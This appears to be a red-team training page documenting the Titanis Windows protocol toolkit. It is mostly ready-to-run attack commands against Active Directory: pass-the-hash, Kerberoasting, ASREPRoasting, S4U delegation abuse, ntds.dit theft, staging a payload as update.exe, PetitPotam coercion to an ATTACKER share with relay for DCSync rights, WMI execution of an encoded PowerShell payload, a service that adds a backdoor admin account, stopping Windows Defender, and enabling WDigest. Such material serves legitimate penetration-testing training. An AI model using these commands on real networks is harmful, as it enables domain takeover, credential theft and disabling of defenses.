---
layout: training-page
title: "Titanis — Windows Protocol Toolkit — Red Team Academy"
module: "Active Directory"
tags:
  - active-directory
  - kerberos
  - smb
  - ldap
  - wmi
  - credential-coercion
  - titanis
page_key: "ad-titanis"
render_with_liquid: false
---

# Titanis — Windows Protocol Toolkit

Titanis is a cross-platform (Windows and Linux) C# library and command-line toolkit implementing low-level Windows protocols from scratch: SMB2, MSRPC, LDAP, Kerberos, and NTLM. Unlike Impacket (Python) or Rubeus (.NET), Titanis uses its own protocol implementations, making it useful for protocol-level testing, evasion research, and scenarios where existing tools are signatured. It runs on .NET 8 and does not require a domain-joined machine.

## Build from Source

```
# Requirements: .NET 8 SDK, Linux or Windows
git clone https://github.com/titanis-project/titanis  # check actual repo URL

# Build:
cd titanis
dotnet build Titanis.sln -c Release

# Individual tools are in tools/ — each compiles to a standalone binary
# All tools support -Socks5 <host:port> for routing through a SOCKS5 proxy
```

## Authentication Parameters

All Titanis commands use a uniform set of authentication flags. Titanis does not pull credentials from the current session — everything must be specified explicitly.

```
# Password authentication (NTLM + Kerberos):
-UserName DOMAIN\username -Password 'Password123!'

# NTLM hash (pass-the-hash, NTLM only):
-UserName DOMAIN\username -NtlmHash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# AES key (pass-the-key, Kerberos only):
-UserName username@DOMAIN.LOCAL -AesKey <hex_aes256_key>

# Kerberos ticket from ccache file (Linux-compatible):
-TicketCache /tmp/krb5cc_1000 -Kdc DC01.DOMAIN.LOCAL

# PKINIT — certificate authentication:
-UserName username@DOMAIN.LOCAL -UserCert user.pfx -UserKeyPassword 'pfxpassword'

# Combine with SOCKS5 proxy (useful when pivoting through a compromised host):
-Socks5 127.0.0.1:1080

# Titanis supports both .kirbi and .ccache ticket files — no conversion needed
# Set KRB5CCNAME environment variable to avoid specifying -TicketCache each time:
export KRB5CCNAME=/tmp/tickets.ccache
```

## Kerberos — Kerb Tool

```
# Request a TGT (AS-REQ):
Kerb asreq username DC01.DOMAIN.LOCAL -Password 'Password123!' -TicketCache /tmp/tickets.ccache

# Request TGT with NTLM hash (overpass-the-hash / pass-the-key):
Kerb asreq username DC01.DOMAIN.LOCAL -NtlmHash <NTLM_HASH> -TicketCache /tmp/tickets.ccache

# Request TGT with AES key:
Kerb asreq username DC01.DOMAIN.LOCAL -AesKey <AES256_KEY> -TicketCache /tmp/tickets.ccache

# PKINIT — request TGT using certificate (Shadow Credentials, ADCS):
Kerb asreq username DC01.DOMAIN.LOCAL -UserCert user.pfx -UserKeyPassword '' -TicketCache /tmp/tickets.ccache

# ASREPRoast — get AS-REP for user with no pre-auth required:
Kerb getasinfo username DC01.DOMAIN.LOCAL   # check encryption types
Kerb asreq username DC01.DOMAIN.LOCAL -EncTypes RC4-HMAC   # request RC4 ticket for cracking

# Request a service ticket (TGS-REQ / Kerberoast):
Kerb tgsreq username DC01.DOMAIN.LOCAL -Spn MSSQLSvc/sql01.domain.local:1433 -TicketCache /tmp/tickets.ccache

# Request service ticket with RC4 encryption (Kerberoasting):
Kerb tgsreq username DC01.DOMAIN.LOCAL -Spn MSSQLSvc/sql01.domain.local:1433 -EncTypes RC4-HMAC

# S4U2self / S4U2proxy (constrained delegation abuse):
# Request a ticket on behalf of another user using S4U2self:
Kerb tgsreq svc_account DC01.DOMAIN.LOCAL -S4uSelf -S4uUser administrator@DOMAIN.LOCAL -TicketCache /tmp/tickets.ccache

# Change password:
Kerb changepw username DC01.DOMAIN.LOCAL -Password 'OldPass' -NewPassword 'NewPass!'

# Inspect/select tickets from a file:
Kerb select /tmp/tickets.ccache
```

## LDAP — Ldap Tool

```
# Enumerate AD users:
Ldap query DC01.DOMAIN.LOCAL -UserName DOMAIN\user -Password 'Password123!' \
  -Base "DC=domain,DC=local" \
  -Filter "(objectClass=user)" \
  -Attr samAccountName,userPrincipalName,memberOf

# Find Kerberoastable accounts (servicePrincipalName set, enabled):
Ldap query DC01.DOMAIN.LOCAL -UserName DOMAIN\user -Password 'Password123!' \
  -Filter "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
  -Attr samAccountName,servicePrincipalName

# Find ASREPRoastable accounts (DONT_REQUIRE_PREAUTH):
Ldap query DC01.DOMAIN.LOCAL -UserName DOMAIN\user -Password 'Password123!' \
  -Filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  -Attr samAccountName

# Find accounts with unconstrained delegation:
Ldap query DC01.DOMAIN.LOCAL -UserName DOMAIN\user -Password 'Password123!' \
  -Filter "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  -Attr samAccountName,dNSHostName

# Enumerate domain admins:
Ldap query DC01.DOMAIN.LOCAL -UserName DOMAIN\user -Password 'Password123!' \
  -Base "CN=Domain Admins,CN=Users,DC=domain,DC=local" \
  -Attr member
```

## SMB2 — Smb2Client Tool

```
# List shares on a remote host:
Smb2Client enumshares \\DC01.DOMAIN.LOCAL -UserName DOMAIN\user -Password 'Password123!'

# List directory contents:
Smb2Client ls \\DC01.DOMAIN.LOCAL\SYSVOL\domain.local\Policies

# Download a file:
Smb2Client get \\DC01.DOMAIN.LOCAL\C$\Windows\NTDS\ntds.dit -Out /tmp/ntds.dit \
  -UserName DOMAIN\administrator -Password 'Admin123!'

# Upload a file (for staging payloads):
Smb2Client put /tmp/payload.exe \\DC01.DOMAIN.LOCAL\C$\Temp\update.exe \
  -UserName DOMAIN\administrator -NtlmHash <NTLM_HASH>

# Enumerate active sessions on a server (requires admin):
Smb2Client enumsessions \\DC01.DOMAIN.LOCAL -UserName DOMAIN\administrator -Password 'Admin123!'

# List open files:
Smb2Client enumopenfiles \\FILESERVER.DOMAIN.LOCAL -UserName DOMAIN\administrator -Password 'Admin123!'

# Watch directory for changes (useful for detecting scripts/tools deployed to a share):
Smb2Client watch \\FILESERVER.DOMAIN.LOCAL\C$\Temp -UserName DOMAIN\admin -Password 'Admin123!'

# Enumerate snapshots (VSS copies):
Smb2Client enumsnapshots \\DC01.DOMAIN.LOCAL\C$ -UserName DOMAIN\administrator -Password 'Admin123!'
```

## Credential Coercion — CredCoerce Tool

Forces a Windows host to authenticate to an attacker-controlled listener using RPC calls. Used in NTLM relay and hash capture attacks.

```
# Coerce authentication via EFS RPC (PetitPotam):
CredCoerce -Techniques Efs.OpenFile \\VICTIM.DOMAIN.LOCAL \\ATTACKER\share \
  -UserName DOMAIN\user -Password 'Password123!'

# Use all available EFS coercion techniques:
CredCoerce -Techniques '*' \\VICTIM.DOMAIN.LOCAL \\ATTACKER\share \
  -UserName DOMAIN\user -Password 'Password123!'

# Specific EFS techniques:
# Efs.OpenFile           — EfsRpcOpenFileRaw
# Efs.EncryptFile        — EfsRpcEncryptFileSrv
# Efs.DecryptFile        — EfsRpcDecryptFileSrv
# Efs.QueryUsersOnFile
# Efs.AddUsersToFile
# Efs.FileKeyInfo
# Efs.DuplicateEncryptionInfoFile

# Listen for incoming NetNTLMv2 hashes on attacker (pick one):
sudo python3 Responder.py -I eth0 -dwPv
sudo impacket-ntlmrelayx -smb2support -t smb://TARGETDC -i

# Coerce → relay → LDAP (if target not signed):
# 1. Start ntlmrelayx targeting DC via LDAP
# 2. Run CredCoerce against a machine account
# 3. Relay machine account NTLM → DC LDAP → add DCSync rights or create account
```

## WMI — Remote Execution

```
# Execute command on remote host via WMI:
Wmi exec VICTIM.DOMAIN.LOCAL -UserName DOMAIN\administrator -Password 'Admin123!' \
  -Command "cmd /c whoami > C:\Temp\out.txt"

# Query WMI — list running processes:
Wmi query VICTIM.DOMAIN.LOCAL -UserName DOMAIN\administrator -Password 'Admin123!' \
  -Query "SELECT Name,ProcessId,ExecutablePath FROM Win32_Process"

# List WMI classes in a namespace:
Wmi lsclass VICTIM.DOMAIN.LOCAL -UserName DOMAIN\administrator -Password 'Admin123!'

# Invoke WMI method:
Wmi invoke VICTIM.DOMAIN.LOCAL "Win32_Process" Create \
  -Args "powershell.exe -enc BASE64PAYLOAD" \
  -UserName DOMAIN\administrator -Password 'Admin123!'
```

## Service Control Manager — SCM Tool

```
# Create and start a service for lateral movement:
Scm create VICTIM.DOMAIN.LOCAL -UserName DOMAIN\administrator -Password 'Admin123!' \
  -ServiceName evil-svc \
  -BinaryPath "cmd /c net user backdoor P@ssw0rd! /add && net localgroup administrators backdoor /add" \
  -Start

# Query service status:
Scm query VICTIM.DOMAIN.LOCAL -UserName DOMAIN\administrator -Password 'Admin123!' \
  -ServiceName wuauserv

# Stop a service (for disabling defenses):
Scm stop VICTIM.DOMAIN.LOCAL -UserName DOMAIN\administrator -Password 'Admin123!' \
  -ServiceName WinDefend

# Delete service after use:
Scm delete VICTIM.DOMAIN.LOCAL -UserName DOMAIN\administrator -Password 'Admin123!' \
  -ServiceName evil-svc
```

## LSA and SAM — Privilege & Account Operations

```
# Whoami — get current user context on remote LSA:
Lsa whoami VICTIM.DOMAIN.LOCAL -UserName DOMAIN\user -Password 'Password123!'

# Get privileges of a specific account:
Lsa getprivs VICTIM.DOMAIN.LOCAL -UserName DOMAIN\administrator -Password 'Admin123!' \
  -Account DOMAIN\targetuser

# Look up SID for an account name:
Lsa lookupname VICTIM.DOMAIN.LOCAL -UserName DOMAIN\user -Password 'Password123!' \
  -AccountName DOMAIN\administrator

# Enumerate SAM users on remote machine (requires admin):
Sam enumusers VICTIM.DOMAIN.LOCAL -UserName DOMAIN\administrator -Password 'Admin123!'
```

## Remote Registry — Reg Tool

```
# Read registry value remotely:
Reg query VICTIM.DOMAIN.LOCAL -UserName DOMAIN\administrator -Password 'Admin123!' \
  -Hive LocalMachine -Key "SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Value ProductName

# Write registry value (e.g., enable WDigest):
Reg set VICTIM.DOMAIN.LOCAL -UserName DOMAIN\administrator -Password 'Admin123!' \
  -Hive LocalMachine \
  -Key "SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" \
  -Value UseLogonCredential -Data 1 -Type DWord
```

## Resources

- Titanis documentation — `github.com/titanis-project/titanis/tree/main/doc`
- MS-SMB2 spec — `docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/`
- MS-KILE Kerberos spec — `docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/`
- MITRE ATT&CK T1558 — Steal or Forge Kerberos Tickets — `attack.mitre.org/techniques/T1558/`
- MITRE ATT&CK T1187 — Forced Authentication — `attack.mitre.org/techniques/T1187/`
